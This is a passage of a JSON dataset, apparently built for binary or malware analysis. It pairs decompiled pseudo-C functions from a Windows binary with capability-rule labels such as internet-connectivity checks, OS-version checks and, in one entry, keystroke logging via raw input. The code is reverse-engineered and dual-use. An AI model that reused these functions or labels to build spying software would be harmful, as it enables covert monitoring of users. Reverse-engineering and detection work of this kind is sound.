            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00026b60(uint *arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    char *arg_ch_00;\n    char *arg_8h_00;\n    uint var_1dch;\n    char *var_1d8h;\n    uint *var_1d4h;\n    uint var_1d0h;\n    uint var_1c8h;\n    uint *var_1c4h;\n    uint var_1c0h;\n    uint var_1b8h;\n    char *var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    char *var_1a8h;\n    uint var_1a4h;\n    int32_t var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_118h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_ch == 0) {\n        var_1a0h = fcn.000298c0(200, 0);\n    }\n    else {\n        var_1a0h = fcn.000298c0(300, 0);\n    }\n    if (var_1a0h == 0) {\n        uVar2 = 0x21590064;\n    }\n    else {\n        var_8h = fcn.00078a6e();\n        var_8h = var_8h % var_1a0h;\n        if (arg_ch == 0) {\n            var_4h = fcn.000294e0(var_8h + 0xc9, &var_198h, 0x80, &var_ch);\n        }\n        else {\n            var_4h = fcn.000294e0(var_8h + 0x12d, &var_198h, 0x80, &var_ch);\n        }\n        if (var_4h == 0) {\n            var_118h._0_1_ = '\\0';\n            if (arg_ch == 0) {\n                fcn.000294e0(var_8h + 0xd4, &var_118h, 0x100, &var_ch);\n            }\n            else {\n                fcn.000294e0(var_8h + 0x138, &var_118h, 0x100, &var_ch);\n            }\n            puVar3 = fcn.00078a44(&var_198h, 0x2f);\n            if (puVar3 == NULL) {\n                uVar2 = 0x21590064;\n            }\n            else {\n                *puVar3 = 0;\n                var_14h = &var_198h;\n                var_10h = 0;\n                var_1b4h = puVar3 + 1;\n                do {\n                    cVar1 = *var_1b4h;\n                    var_1b4h = var_1b4h + 1;\n                } while (cVar1 != '\\0');\n                uVar2 = fcn.00077340(arg_8h, &var_14h, puVar3 + 1, var_1b4h + (1 - (puVar3 + 2)), 1);\n                if (uVar2 == 0) {\n                    if (var_118h != '\\0') {\n                        var_1c4h = &var_118h;\n                        do {\n                            cVar1 = *var_1c4h;\n                            var_1c4h = var_1c4h + 1;\n                        } while (cVar1 != '\\0');\n                        arg_8h_00 = var_1c4h + (2 - (&var_118h + 1));\n                        arg_ch_00 = fcn.000356c0(arg_8h_00);\n                        if (arg_ch_00 == NULL) {\n                            fcn.000775b0(arg_8h, 0);\n                            return 0x21590004;\n                        }\n                        var_1d4h = &var_118h;\n                        var_1d8h = arg_ch_00;\n                        do {\n                            cVar1 = *var_1d4h;\n                            *var_1d8h = cVar1;\n                            var_1d4h = var_1d4h + 1;\n                            var_1d8h = var_1d8h + 1;\n                        } while (cVar1 != '\\0');\n                        arg_ch_00[arg_8h_00 + -1] = '\\0';\n                        for (var_1a8h = arg_ch_00; *var_1a8h != '\\0'; var_1a8h = var_1a8h + 1) {\n                            if (*var_1a8h == ',') {\n                                *var_1a8h = '\\0';\n                            }\n                        }\n                        uVar2 = fcn.000776c0(*arg_8h, arg_ch_00, 0);\n                        if (uVar2 != 0) {\n                            fcn.000357f0(arg_ch_00);\n                            fcn.000775b0(arg_8h, 0);\n                            fcn.00029dc0(1, 0, uVar2, 0, 0);\n                            return uVar2;\n                        }\n                        fcn.000357f0(arg_ch_00);\n                    }\n                    if (arg_10h != NULL) {\n                        *arg_10h = var_8h + 1000000000;\n                    }\n                    uVar2 = 0;\n                }\n                else {\n                    fcn.00029dc0(1, 0, uVar2, 0, 0);\n                }\n            }\n        }\n        else {\n            uVar2 = var_4h + 0x191U | 0x21590000;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 1368
    },
    "000270d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.000270d0(void)\n\n{\n    fcn.000349b0(0x800ccfc4);\n    *0x800cd104 = fcn.000357b0(0x1a0, 0x14);\n    if (*0x800cd104 != 0) {\n        fcn.000344b0(0x800ccf1c);\n        fcn.0001ace0(0x800cd108, 0x80068f30, 0);\n        if (*0x800dbb2c == 0) {\n            *0x800dbb2c = -0x7ff98810;\n        }\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "00027130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00027130(void)\n\n{\n    int32_t var_4h;\n    \n    fcn.00034570(0x800ccf1c);\n    fcn.00037760(0x800cd108, 0);\n    fcn.00037710(0x800cd108);\n    fcn.00034540(0x800ccf1c);\n    if (*0x800cd104 != 0) {\n        fcn.00034a10(0x800ccfc4);\n        for (var_4h = 0; var_4h < 0x14; var_4h = var_4h + 1) {\n            if (*(*0x800cd104 + var_4h * 0x1a0) != 0) {\n                fcn.000775b0(var_4h * 0x1a0 + *0x800cd104, 0);\n            }\n        }\n        fcn.000357f0(*0x800cd104);\n        *0x800cd104 = 0;\n        fcn.00034a80(0x800ccfc4);\n    }\n    fcn.000349e0(0x800ccfc4);\n    return;\n}\n",
        "token_count": 273
    },
    "000271f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x00027251\n\nint32_t __cdecl\nfcn.000271f0(uint noname_0, int32_t arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h, uint *arg_1ch, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint var_30h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_8h = 0;\n    if (((arg_ch < 100) || (*(arg_20h + 8) == '\\x04')) ||\n       (iVar1 = fcn.00028b20(&arg_10h, &arg_14h, &var_8h),  iVar1 == 0)) {\n        if (*(arg_20h + 8) - 1 < 4) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        fcn.00029dc0(5, 0x21590001, 0, arg_ch, *(arg_20h + 4));\n        *arg_18h = 0;\n        *arg_1ch = 0;\n        fcn.000357f0(var_8h);\n        iVar1 = 0x21590001;\n    }\n    return iVar1;\n}\n",
        "token_count": 311
    },
    "00027520": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00027520(uint32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, int32_t *arg_18h, int32_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_34h;\n    uint var_30h;\n    uint *var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint *var_14h;\n    uint32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_18h = 0x21590001;\n    var_ch = NULL;\n    var_10h = 0;\n    var_4h = 0;\n    var_1ch = 0;\n    if (arg_ch < 100) {\n        *arg_18h = 0;\n        *arg_1ch = 0;\n        for (var_8h = 0; var_8h < 6; var_8h = var_8h + 1) {\n            if (*(var_8h * 8 + -0x7ff33ae8) == arg_ch) {\n                var_18h = (**(var_8h * 8 + -0x7ff33ae4))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n                break;\n            }\n        }\n    }\n    else {\n        if (arg_14h == 0) {\n            var_20h = NULL;\n        }\n        else {\n            var_20h = fcn.0002f6b0(arg_10h, arg_14h);\n            if (var_20h == NULL) {\n                return 0x215901f8;\n            }\n        }\n        var_8h = var_10h;\n        var_18h = fcn.0002b3f0(-(arg_20h != 0) & arg_8h, arg_ch, var_20h, &var_1ch, &var_ch, &var_8h, arg_20h);\n        var_10h = var_8h;\n        while (var_20h != NULL) {\n            puVar1 = *var_20h;\n            if (var_20h[4] != var_20h + 5) {\n                fcn.000357f0(var_20h[4]);\n            }\n            fcn.000357f0(var_20h);\n            var_20h = puVar1;\n        }\n        if (0x200 < var_10h) {\n            fcn.00036f70(0x800db890);\n            if ((*0x800ce698 != NULL) && (*0x800ce69c != NULL)) {\n                iVar2 = (**0x800ce69c)(var_10h);\n                var_4h = iVar2 + 4;\n                var_14h = fcn.000356c0(var_4h);\n                if (var_14h != NULL) {\n                    uVar3 = fcn.00035950(var_10h);\n                    *var_14h = uVar3;\n                    var_18h = (**0x800ce698)(var_14h + 1, &var_4h, var_ch, var_10h);\n                    if ((var_18h == 0) && (var_4h < var_10h)) {\n                        var_1ch = var_1ch | 0x80;\n                        fcn.000357f0(var_ch);\n                        var_ch = var_14h;\n                        var_10h = var_4h + 4;\n                    }\n                    else {\n                        fcn.000357f0(var_14h);\n                        var_18h = 0;\n                    }\n                }\n            }\n            fcn.00037020(0x800db890);\n        }\n        iVar2 = fcn.00029960(&var_30h, 0x10, 0x227);\n        if (iVar2 == 0) {\n            iVar2 = fcn.00020700(&var_30h, 0x10, var_10h);\n            *arg_1ch = iVar2 + 1;\n            iVar2 = fcn.00077f80(arg_8h, *arg_1ch, 0);\n            *arg_18h = iVar2;\n            if (*arg_18h == 0) {\n                *arg_1ch = 0;\n                var_18h = 0x21590004;\n            }\n            else {\n                iVar2 = fcn.00020720(&var_30h, 0x10, *arg_18h + 1, var_ch, var_10h);\n                *arg_1ch = iVar2 + 1;\n                **arg_18h = var_1ch;\n            }\n        }\n        else {\n            var_18h = 0x215901f9;\n        }\n    }\n    fcn.000357f0(var_ch);\n    return var_18h;\n}\n",
        "token_count": 1176
    },
    "00027860": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00027860(int32_t *arg_8h)\n\n{\n    int32_t arg_ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    var_4h = arg_8h;\n    var_8h = 0;\n    var_ch = 0x800cc628;\n    var_10h = 0;\n    arg_ch = fcn.00027520(&var_ch, *arg_8h, arg_8h + 4, arg_8h[3], &var_8h, &var_10h, 0);\n    if (((var_4h[1] == 3) && (*var_4h == 1)) && (arg_ch == 0)) {\n        var_14h = 0;\n    }\n    else {\n        var_14h = fcn.00027930(var_4h[2], arg_ch, var_8h, var_10h);\n    }\n    (**0x800cc62c)(&var_ch, var_8h, 0);\n    fcn.00029dc0(5, arg_ch, var_14h, *var_4h, var_4h[2]);\n    fcn.000357f0(arg_8h);\n    return 0;\n}\n",
        "token_count": 314
    },
    "00027930": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00027930(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_14h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    var_18h = arg_ch;\n    var_4h = fcn.000238b0(0xffffffff, 1, arg_8h, arg_10h, arg_14h, &var_18h);\n    if (var_4h == 0) {\n        iVar1 = fcn.00037730(0x800db8a8);\n        if (iVar1 != 0) {\n            fcn.00034570(0x800db8a8);\n        }\n        var_18h = 0;\n    }\n    else {\n        var_18h = var_4h + 0x191U | 0x21590000;\n        iVar1 = fcn.000238b0(0xffffffff, 1, arg_8h, 0, 0, &var_18h);\n        if (iVar1 != 0) {\n            var_18h = iVar1 + 0x191U | 0x21590000;\n        }\n    }\n    return var_18h;\n}\n",
        "token_count": 338
    },
    "000279e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.000279e0(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, int32_t *arg_18h, int32_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *arg_8h_00;\n    uint var_21ch;\n    char *var_218h;\n    uint *var_214h;\n    uint var_210h;\n    uint var_208h;\n    uint *var_204h;\n    uint var_200h;\n    uint var_1f8h;\n    char *var_1f4h;\n    uint var_1f0h;\n    uint var_1ech;\n    char *var_1e8h;\n    uint var_1e4h;\n    int32_t var_1e0h;\n    char *var_1dch;\n    int32_t var_1d8h;\n    uint *var_1d4h;\n    int32_t var_1d0h;\n    int32_t var_1cch;\n    uint var_1c8h;\n    uint *var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1a0h;\n    uint var_120h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_4h;\n    \n    var_1d8h = 0;\n    var_1e0h = 0;\n    iVar2 = fcn.00029960(&fcn.000279e0::var_1b0h, 0x10, 0x228);\n    if (iVar2 == 0) {\n        var_4h = fcn.00020990(&fcn.000279e0::var_1b0h, 0x10, 0x195);\n        if (arg_14h < var_4h) {\n            var_1d8h = 0x21590064;\n        }\n        else {\n            iVar2 = fcn.000207f0(&fcn.000279e0::var_1b0h, 0x10, arg_10h, var_4h);\n            if ((iVar2 == 0x195) &&\n               (iVar2 = fcn.00020840(&fcn.000279e0::var_1b0h, 0x10, &fcn.000279e0::var_1a0h, arg_10h, var_4h), \n               iVar2 == 0x195)) {\n                fcn.00027060(&fcn.000279e0::var_1a0h);\n                if (arg_20h != 0) {\n                    var_1e4h = fcn.000298c0(1, 0);\n                    var_1e4h = fcn.00035950(var_1e4h);\n                    var_1d8h = fcn.00078000(arg_8h, &fcn.000279e0::var_1e4h, 4, 0);\n                    if (var_1d8h != 0) {\n                        var_1d8h = fcn.000280c0(var_1d8h, arg_8h, arg_18h, arg_1ch);\n                        goto code_r0x0002808e;\n                    }\n                }\n                var_1e0h = fcn.00028cd0(&fcn.000279e0::var_1a0h);\n                if (var_1e0h == 0) {\n                    var_1d4h = &fcn.000279e0::var_1a0h;\n                    pcVar3 = fcn.00078a44(var_1d4h, 0x2f);\n                    if (pcVar3 == NULL) {\n                        var_1dch = pcVar3;\n                        var_1d8h = fcn.000280c0(0x21590064, arg_8h, arg_18h, arg_1ch);\n                        goto code_r0x0002808e;\n                    }\n                    *pcVar3 = '\\0';\n                    var_1dch = pcVar3 + 1;\n                    var_1c4h = var_1d4h;\n                    var_1c0h = 0;\n                    var_1f4h = var_1dch;\n                    do {\n                        cVar1 = *var_1f4h;\n                        var_1f4h = var_1f4h + 1;\n                    } while (cVar1 != '\\0');\n                    var_1d8h = fcn.00077340(&fcn.000279e0::var_1e0h, &fcn.000279e0::var_1c4h, var_1dch, \n                                            var_1f4h + (1 - (pcVar3 + 2)), 1);\n                    if (var_1d8h != 0) {\n                        var_1d8h = fcn.000280c0(var_1d8h, arg_8h, arg_18h, arg_1ch);\n                        goto code_r0x0002808e;\n                    }\n                    var_1dch[-1] = '/';\n                    if (var_120h != '\\0') {\n                        var_204h = &fcn.000279e0::var_120h;\n                        do {\n                            cVar1 = *var_204h;\n                            var_204h = var_204h + 1;\n                        } while (cVar1 != '\\0');\n                        arg_8h_00 = var_204h + (2 - (&fcn.000279e0::var_120h + 1));\n                        pcVar3 = fcn.000356c0(arg_8h_00);\n                        if (pcVar3 == NULL) {\n                            fcn.000775b0(&fcn.000279e0::var_1e0h, 0);\n                            var_1d8h = fcn.000280c0(0x21590004, arg_8h, arg_18h, arg_1ch);\n                            goto code_r0x0002808e;\n                        }\n                        var_214h = &fcn.000279e0::var_120h;\n                        var_218h = pcVar3;\n                        do {\n                            cVar1 = *var_214h;\n                            *var_218h = cVar1;\n                            var_214h = var_214h + 1;\n                            var_218h = var_218h + 1;\n                        } while (cVar1 != '\\0');\n                        pcVar3[arg_8h_00 + -1] = '\\0';\n                        for (var_1e8h = pcVar3; *var_1e8h != '\\0'; var_1e8h = var_1e8h + 1) {\n                            if (*var_1e8h == ',') {\n                                *var_1e8h = '\\0';\n                            }\n                        }\n                        var_1d8h = fcn.000776c0(var_1e0h, pcVar3, 0);\n                        if (var_1d8h != 0) {\n                            fcn.000357f0(pcVar3);\n                            fcn.000775b0(&fcn.000279e0::var_1e0h, 0);\n                            var_1d8h = fcn.000280c0(var_1d8h, arg_8h, arg_18h, arg_1ch);\n                            goto code_r0x0002808e;\n                        }\n                        fcn.000357f0(pcVar3);\n                    }\n                }\n                if (arg_20h == 0) {\n                    var_1d8h = fcn.00077970(var_1e0h, var_20h, arg_10h + var_4h, arg_14h - var_4h, \n                                            &fcn.000279e0::var_1b4h, &fcn.000279e0::var_1bch, &fcn.000279e0::var_1d0h, \n                                            var_1ch, 0);\n                    if (var_1d8h != 0) {\n                        fcn.000775b0(&fcn.000279e0::var_1e0h, 0);\n                        var_1d8h = fcn.000280c0(var_1d8h, arg_8h, arg_18h, arg_1ch);\n                        goto code_r0x0002808e;\n                    }\n                }\n                else {\n                    var_1d8h = fcn.00077a90(var_1e0h, var_20h, arg_10h + var_4h, arg_14h - var_4h, \n                                            &fcn.000279e0::var_1b8h, 0);\n                    if (var_1d8h != 0) {\n                        fcn.000775b0(&fcn.000279e0::var_1e0h, 0);\n                        var_1d8h = fcn.000280c0(var_1d8h, arg_8h, arg_18h, arg_1ch);\n                        goto code_r0x0002808e;\n                    }\n                    var_1cch = var_1e0h;\n                    var_1c8h = var_1b8h;\n                    var_1d8h = fcn.00078030(arg_8h, 0xe, &fcn.000279e0::var_1cch, 8, 0);\n                    if (var_1d8h != 0) {\n                        fcn.00077ed0(var_1e0h, var_1b8h);\n                    }\n                    var_1d8h = fcn.00077d40(var_1e0h, var_1b8h, &fcn.000279e0::var_1b4h, &fcn.000279e0::var_1bch, \n                                            &fcn.000279e0::var_1d0h, var_1ch, 0);\n                    if (var_1d8h != 0) {\n                        var_1d8h = fcn.000280c0(var_1d8h, arg_8h, arg_18h, arg_1ch);\n                        goto code_r0x0002808e;\n                    }\n                }\n                if (var_1d0h == 0) {\n                    *arg_18h = 0;\n                    *arg_1ch = 0;\n                }\n                else {\n                    iVar2 = fcn.00077f80(arg_8h, var_1d0h, 0);\n                    *arg_18h = iVar2;\n                    if (*arg_18h == 0) {\n                        var_1d8h = 0x21590004;\n                        fcn.00077e50(0x28032, var_1bch);\n                        goto code_r0x0002808e;\n                    }\n                    fcn.00078be8(*arg_18h, var_1bch, var_1d0h);\n                    *arg_1ch = var_1d0h;\n                }\n                fcn.00077e50(var_1e0h, var_1bch);\n                var_1d8h = var_1b4h;\n            }\n            else {\n                var_1d8h = 0x21590064;\n            }\n        }\n    }\n    else {\n        var_1d8h = 0x215901f9;\n    }\ncode_r0x0002808e:\n    if (var_1e0h != 0) {\n        fcn.00028e60(var_1e0h, &fcn.000279e0::var_1a0h);\n    }\n    return var_1d8h;\n}\n",
        "token_count": 2716
    },
    "000280c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000280c0(uint arg_8h, uint arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    uint *arg_8h_00;\n    uint uVar1;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00077f80(arg_ch, 0x14, 0);\n    if (arg_8h_00 == NULL) {\n        *arg_10h = 0;\n        *arg_14h = 0;\n    }\n    else {\n        *arg_8h_00 = 0;\n        arg_8h_00[1] = 0;\n        arg_8h_00[2] = 0;\n        arg_8h_00[3] = 0;\n        arg_8h_00[4] = 0;\n        uVar1 = fcn.000298c0(1, 0);\n        *arg_8h_00 = uVar1;\n        arg_8h_00[1] = arg_8h;\n        fcn.000270a0(arg_8h_00);\n        *arg_10h = arg_8h_00;\n        *arg_14h = 0x14;\n    }\n    fcn.00029dc0(6, arg_8h, 0, 0, 0);\n    return 0x215901f4;\n}\n",
        "token_count": 318
    },
    "00028150": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.00028150(uint arg_8h, uint noname_1, uint *arg_10h, uint32_t arg_14h, int32_t *arg_18h, int32_t *arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_1ch = 0;\n    var_14h = 0;\n    if (arg_14h < 0x3d) {\n        var_18h = 0x21590064;\n    }\n    else {\n        var_10h = arg_10h;\n        fcn.000255d0(arg_10h);\n        var_8h = fcn.000238f0(*var_10h, var_10h[1], &var_4h, &var_1ch);\n        if (var_8h == 0) {\n            if (var_4h == 0) {\n                *arg_18h = 0;\n                *arg_1ch = 0;\n            }\n            else {\n                iVar1 = fcn.00077f80(arg_8h, var_4h << 6, 0);\n                if (iVar1 == 0) {\n                    var_18h = 0x21590004;\n                    goto code_r0x00028259;\n                }\n                fcn.00078be8(iVar1, var_1ch, var_4h << 6);\n                for (var_ch = 0; var_ch < var_4h; var_ch = var_ch + 1) {\n                    fcn.000256a0(var_ch * 0x40 + iVar1);\n                }\n                *arg_18h = iVar1;\n                *arg_1ch = var_4h << 6;\n            }\n            var_18h = 0;\n        }\n        else {\n            var_18h = var_8h + 0x191U | 0x21590000;\n        }\n    }\ncode_r0x00028259:\n    fcn.00023b90(var_1ch);\n    fcn.000357f0(var_14h);\n    return var_18h;\n}\n",
        "token_count": 537
    },
    "00028280": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.00028280(uint arg_8h, uint noname_1, uint *arg_10h, uint32_t arg_14h, int32_t *arg_18h, uint *arg_1ch, \n            int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t var_64h;\n    int32_t var_60h;\n    uint32_t var_5ch;\n    uint32_t var_58h;\n    uint32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_20h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_60h = 0;\n    var_10h = 0;\n    if (arg_14h < 0x3d) {\n        var_64h = 0x21590064;\n    }\n    else {\n        var_ch = arg_10h;\n        fcn.000255d0(arg_10h);\n        if ((var_ch[1] == 0) && (*(var_ch + 3) == '\\x1b')) {\n            fcn.0002a810(*var_ch, var_ch[2]);\n        }\n        if ((*(var_ch + 3) & 0x10) != 0) {\n            fcn.00028a60(*var_ch, var_ch[1], var_ch[2]);\n        }\n        if ((*(var_ch + 3) & 1) == 0) {\n            var_4h = fcn.00023930(*var_ch, var_ch[1], var_ch + 2, &var_50h);\n        }\n        else {\n            var_4h = fcn.00023930(*var_ch, var_ch[1], 0, &var_50h);\n        }\n        if (var_4h == 0) {\n            var_5ch = *(var_ch + 0x11);\n            if (var_5ch == 0) {\n                var_5ch = var_20h - *(var_ch + 0xd);\n            }\n            if (arg_20h == 0) {\n                if ((*(var_ch + 3) & 4) == 0) {\n                    if (var_20h == 0) {\n                        *arg_18h = 0;\n                        *arg_1ch = 0;\n                    }\n                    else {\n                        iVar1 = fcn.00077f80(arg_8h, var_5ch, 0);\n                        *arg_18h = iVar1;\n                        if (*arg_18h == 0) {\n                            var_64h = 0x21590004;\n                            goto code_r0x00028677;\n                        }\n                        var_4h = fcn.00023a30(*var_ch, var_ch[1], var_4ch, *(var_ch + 0xd), *arg_18h, var_5ch, &var_8h);\n                        if (var_4h != 0) {\n                            var_64h = var_4h + 0x191U | 0x21590000;\n                            goto code_r0x00028677;\n                        }\n                        *arg_1ch = var_8h;\n                    }\n                }\n                else {\n                    iVar1 = fcn.00077f80(arg_8h, 0x40, 0);\n                    *arg_18h = iVar1;\n                    if (*arg_18h == 0) {\n                        var_64h = 0x21590004;\n                        goto code_r0x00028677;\n                    }\n                    fcn.000256a0(&var_50h);\n                    puVar3 = &var_50h;\n                    puVar4 = *arg_18h;\n                    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n                        *puVar4 = *puVar3;\n                        puVar3 = puVar3 + 1;\n                        puVar4 = puVar4 + 1;\n                    }\n                    fcn.000256a0(&var_50h);\n                    *arg_1ch = 0x40;\n                }\n            }\n            else {\n                if ((*(var_ch + 3) & 6) != 0) {\n                    fcn.000256a0(&var_50h);\n                    var_64h = fcn.00078000(arg_8h, &var_50h, 0x40, 0);\n                    if (var_64h != 0) goto code_r0x00028677;\n                    fcn.000256a0(&var_50h);\n                }\n                if ((*(var_ch + 3) & 4) == 0) {\n                    if ((*(var_ch + 0x19) == 0) || (*(var_ch + 0x19) < *(var_ch + 0x15))) {\n                        var_64h = 0x21590064;\n                        goto code_r0x00028677;\n                    }\n                    var_60h = fcn.000356c0(*(var_ch + 0x19));\n                    if (var_60h == 0) {\n                        var_64h = 0x21590004;\n                        goto code_r0x00028677;\n                    }\n                    for (var_58h = 0; var_58h < var_5ch; var_58h = var_58h + var_54h) {\n                        if (*(var_ch + 0x19) < *(var_ch + 0x15) || *(var_ch + 0x19) == *(var_ch + 0x15)) {\n                            uVar2 = fcn.00078a6e();\n                            var_54h = uVar2 % ((*(var_ch + 0x15) - *(var_ch + 0x19)) + 1U) + *(var_ch + 0x19);\n                        }\n                        else {\n                            uVar2 = fcn.00078a6e();\n                            var_54h = uVar2 % ((*(var_ch + 0x19) - *(var_ch + 0x15)) + 1U) + *(var_ch + 0x15);\n                        }\n                        if ((var_54h == 0) || (*(var_ch + 0x19) <= var_54h && var_54h != *(var_ch + 0x19))) {\n                            var_64h = 0x215901f6;\n                            goto code_r0x00028677;\n                        }\n                        var_4h = fcn.00023a30(*var_ch, var_ch[1], var_4ch, *(var_ch + 0xd) + var_58h, var_60h, var_54h, \n                                              &var_54h);\n                        if (var_4h != 0) {\n                            var_64h = var_4h + 0x191U | 0x21590000;\n                            goto code_r0x00028677;\n                        }\n                        var_64h = fcn.00078000(arg_8h, var_60h, var_54h, 0);\n                        if (var_64h != 0) goto code_r0x00028677;\n                    }\n                    var_64h = fcn.00078000(arg_8h, 0, 0, 0);\n                    if (var_64h != 0) goto code_r0x00028677;\n                }\n            }\n            if (((*(var_ch + 3) & 8) == 0) || (var_4h = fcn.00023a80(*var_ch, var_ch[1], var_4ch),  var_4h == 0)) {\n                var_64h = 0;\n            }\n            else {\n                var_64h = var_4h + 0x191U | 0x21590000;\n            }\n        }\n        else {\n            var_64h = var_4h + 0x191U | 0x21590000;\n        }\n    }\ncode_r0x00028677:\n    fcn.000357f0(var_60h);\n    fcn.000357f0(var_10h);\n    return var_64h;\n}\n",
        "token_count": 1860
    },
    "000286a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
